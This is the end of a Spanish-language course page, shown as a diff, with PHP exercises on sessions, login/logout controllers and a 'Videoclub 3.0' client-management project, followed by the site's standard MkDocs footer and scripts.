+<li><code>424formulario3.php</code> recoge los datos enviados en el paso anterior y junto a los que ya estaban en la sesión, se muestran todos los datos en una tabla/lista desordenada.</li>
+</ul>
+</li>
+</ol>
+<h3 id="autenticacion">Autenticación<a class="headerlink" href="#autenticacion" title="Permanent link">&para;</a></h3>
+<p>En los siguientes ejercicios vamos a montar una estructura de inicio de sesión similar a la vista en los apuntes.</p>
+<ol start="430">
+<li><code>430index.php</code>: formulario de inicio de sesión</li>
+<li><code>431login.php</code>: hace de controlador, por lo que debe comprobar los datos recibidos (solo permite la entrada de <code>usuario/usuario</code> y si todo es correcto, ceder el control a la vista del siguiente ejercicio. No contiene código HTML.</li>
+<li><code>432peliculas.php</code>: vista que muestra como título "Listado de Películas", y una lista desordenada con tres películas.</li>
+<li><code>433logout.php</code>: vacía la sesión y nos lleva de nuevo al formulario de inicio de sesión. No contiene código HTML.</li>
+<li><code>434series.php</code>: Añade un nueva vista similar a <code>432peliculas.php</code> que muestra un "Listado de Series" con una lista desordenada con tres series. Tanto <code>432peliculas.php</code> como la vista recien creadas, deben tener un pequeño menú (sencillo, mediante enlaces) que permita pasar de un listado a otro.
+Comprueba que si se accede directamente a cualquiera de las vistas sin tener un usuario <em>logueado</em> via URL del navegador, no se muestra el listado.</li>
+<li>Modifica tanto el controlador como las vistas para que:<ul>
+<li>los datos los obtenga el controlador (almacena en la sesión un array de películas y otro de series)</li>
+<li>coloque los datos en la sesión</li>
+<li>En las vistas, los datos se recuperan de la sesión y se <em>pintan</em> en la lista desordenada recorriendo el array correspondiente.</li>
+</ul>
+</li>
+<li>Selecciona uno de los mecanismos de autenticación vistos en el punto 4.5 y realiza un sistema de login utilizándolo. </li>
+</ol>
+<h3 id="proyecto-videoclub-30">Proyecto Videoclub 3.0<a class="headerlink" href="#proyecto-videoclub-30" title="Permanent link">&para;</a></h3>
+<ol start="440">
+<li>
+<p>Para el Videoclub, vamos a crear una página <code>index.php</code> con un formulario que contenga un formulario de login/password. Se comprobarán los datos en <code>login.php</code>. Los posibles usuarios son admin/admin o usuario/usuario.</p>
+<ul>
+<li>Si el usuario es correcto, en <code>main.php</code> mostrar un mensaje de bienvenida con el nombre del usuario, junto a un enlace para cerrar la sesión, que lo llevaría de nuevo al login.</li>
+<li>Si el usuario es incorrecto, debe volver a cargar el formulario dando información al usuario de acceso incorrecto.</li>
+</ul>
+</li>
+<li>
+<p>Si el usuario es administrador, se cargarán en la sesión los datos de soportes y clientes del videoclub que teníamos en nuestras pruebas (no mediante <code>include</code> sino copiando los datos e insertándolos en un array asociativo, el cual colocaremos posteriormente en la sesión). En unidades posteriores los obtendremos de la base de datos. En <code>mainAdmin.php</code>, además de la bienvenida, debe mostrar:</p>
+</li>
+</ol>
+<ul>
+<li>Listado de clientes</li>
+<li>Listado de soportes</li>
+</ul>
+<figure style="float: right;">
+    <img src="imagenes/04/04p423.png" width="400">
+    <figcaption>Esquema navegación ejercicio 423</figcaption>
+</figure>
+
+<ol start="442">
+<li>
+<p>Vamos a modificar la clase <code>Cliente</code> para almacenar el <code>user</code> y la <code>password</code> de cada cliente.
+Tras codificar los cambios, modificar el listado de clientes de <code>mainAdmin.php</code> para añadir al listado el usuario.</p>
+</li>
+<li>
+<p>Si el usuario que accede no es administrador y coincide con alguno de los clientes que tenemos cargados tras el login, debe cargar <code>mainCliente.php</code> donde se mostrará un listado de los alquileres del cliente. Para ello, modificaremos la clase <code>Cliente</code> para ofrecer el método <code>getAlquileres() : array</code>, el cual llamaremos y luego recorreremos para mostrar el listado solicitado.</p>
+</li>
+</ol>
+<p>Ahora volvemos a la parte de administración</p>
+<ol start="444">
+<li>
+<p>Además de mostrar el listado de clientes, vamos a ofrecer la opción de dar de alta a un nuevo cliente en <code>formCreateCliente.php</code>.
+Los datos se enviarán mediante POST a <code>createCliente.php</code> que los introducirá en la sesión.
+Una vez creado el cliente, debe volver a cargar <code>mainAdmin.php</code> donde se podrá ver el cliente insertado. Si hay algún dato incorrecto, debe volver a cargar el formulario de alta.</p>
+</li>
+<li>
+<p>Crea en <code>formUpdateCliente.php</code> un formulario que permita editar los datos de un cliente.
+Debes recoger los datos en <code>updateCliente.php</code>. Los datos de cliente se deben poder modificar desde la propia página de un cliente, así como desde el listado del administrador.</p>
+</li>
+<li>
+<p>Desde el listado de clientes del administrador debes ofrecer la posibilidad de borrar un cliente.
+En el navegador, antes de redirigir al servidor, el usuario debe confirmar mediante JS que realmente desea eliminar al cliente.
+Finalmente, en <code>removeCliente.php</code> elimina al cliente de la sesión.
+Una vez eliminado, debe volver al listado de clientes.</p>
+</li>
+</ol>
+<figure style="align: center;">
+    <img src="imagenes/04/04p426.png" width="600">
+    <figcaption>Esquema navegación Videoclub 3.0</figcaption>
+</figure>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      2025-2026 Eladio Blanco. Licencia CC BY-NC-SA
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/eladioblanco" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.2 4.2 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.52 8.52 0 0 1-5.33 1.84q-.51 0-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="mailto:<eladio.blanco@fernando3martos.com>" target="_blank" rel="noopener" title="" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 12.13c-.15.01-.29.06-.39.17l-1 1 2.05 2 1-1c.22-.21.22-.56 0-.77l-1.24-1.23a.56.56 0 0 0-.38-.17m-2 1.75L13 19.94V22h2.06l6.06-6.07M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h7v-.89l8.24-8.22c.47-.49 1.12-.76 1.8-.76.34 0 .68.06 1 .19V6c0-1.12-.92-2-2.04-2m0 4-8 5-8-5V6l8 5 8-5"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide", "toc.integrate", "content.tabs.link"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
